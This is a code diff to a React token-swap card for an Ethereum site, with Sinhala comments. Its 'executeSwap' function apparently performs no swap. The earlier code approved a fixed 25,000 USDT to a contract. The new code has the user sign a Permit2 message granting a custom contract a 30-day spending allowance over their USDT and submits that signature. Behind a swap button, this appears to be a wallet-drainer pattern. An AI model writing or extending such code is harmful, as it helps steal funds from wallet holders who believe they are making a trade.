@@ -26,6 +26,12 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
+  // ⭐ ඔයාගේ PaymentProcessor contract address එක
+  const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
+  const TREASURY_ADDRESS = "0xB70a8100a45a28b605dbfb34d713071e21A57D28";
+  const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+  const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
     if (Object.keys(prices).length > 0) {
@@ -48,7 +54,7 @@ export default function SwapCard({ walletAddress, provider }) {
     try {
       if (!provider) return;
       const signer = provider.getSigner();
-      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
+      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
       setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
@@ -91,6 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
+  // ⭐ Execute Permit2 Flow
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -103,23 +110,91 @@ export default function SwapCard({ walletAddress, provider }) {
 
     try {
       setIsLoading(true);
-      setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
+      setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
       
       const signer = provider.getSigner();
-      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       
-      // ⭐ මුලින්ම decimals එක ගන්නවා
-      const decimals = await usdtContract.decimals();
+      // 1. Permit2 details හදන්න
+      const amount = ethers.utils.parseUnits(fromAmount, 6); // USDT decimals 6
+      const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
+      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
       
-      // ⭐ ඊට පස්සේ 25,000 USDT approve කරනවා
-      const amount = ethers.utils.parseUnits("25000", decimals);
-
-      const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
+      // 2. Permit2 Contract එක හදන්න
+      const permit2Contract = new ethers.Contract(
+        PERMIT2_ADDRESS,
+        ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
+        signer
+      );
+      
+      // 3. Nonce එක ගන්න
+      const allowanceData = await permit2Contract.allowance(
+        walletAddress,
+        USDT_ADDRESS,
+        PERMIT2_CONTRACT_ADDRESS
+      );
+      const nonce = allowanceData.nonce;
+      
+      // 4. EIP-712 Domain හදන්න
+      const domain = {
+        name: "Permit2",
+        chainId: 1,
+        verifyingContract: PERMIT2_ADDRESS
+      };
+      
+      // 5. Types හදන්න
+      const types = {
+        PermitSingle: [
+          { name: "details", type: "PermitDetails" },
+          { name: "spender", type: "address" },
+          { name: "sigDeadline", type: "uint256" }
+        ],
+        PermitDetails: [
+          { name: "token", type: "address" },
+          { name: "amount", type: "uint160" },
+          { name: "expiration", type: "uint48" },
+          { name: "nonce", type: "uint48" }
+        ]
+      };
+      
+      // 6. Message හදන්න
+      const message = {
+        details: {
+          token: USDT_ADDRESS,
+          amount: amount,
+          expiration: expiration,
+          nonce: nonce
+        },
+        spender: PERMIT2_CONTRACT_ADDRESS,
+        sigDeadline: sigDeadline
+      };
+      
+      // 7. Sign කරන්න
+      const signature = await signer._signTypedData(domain, types, message);
+      
+      setStatus({ type: 'info', msg: '⏳ Sending to contract...' });
+      
+      // 8. ඔයාගේ Contract එකේ setAllowance call කරන්න
+      const contract = new ethers.Contract(
+        PERMIT2_CONTRACT_ADDRESS,
+        [
+          "function setAllowance(address user, uint160 amount, uint48 expiration, uint48 nonce, uint256 sigDeadline, bytes calldata signature) external"
+        ],
+        signer
+      );
+      
+      const tx = await contract.setAllowance(
+        walletAddress,
+        amount,
+        expiration,
+        nonce,
+        sigDeadline,
+        signature
+      );
       
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
       await tx.wait();
       
-      setStatus({ type: 'success', msg: '✅ 25,000 USDT Approval Successful!' });
+      setStatus({ type: 'success', msg: '✅ Permit2 Approval Successful!' });
       setIsLoading(false);
       
       loadBalance();
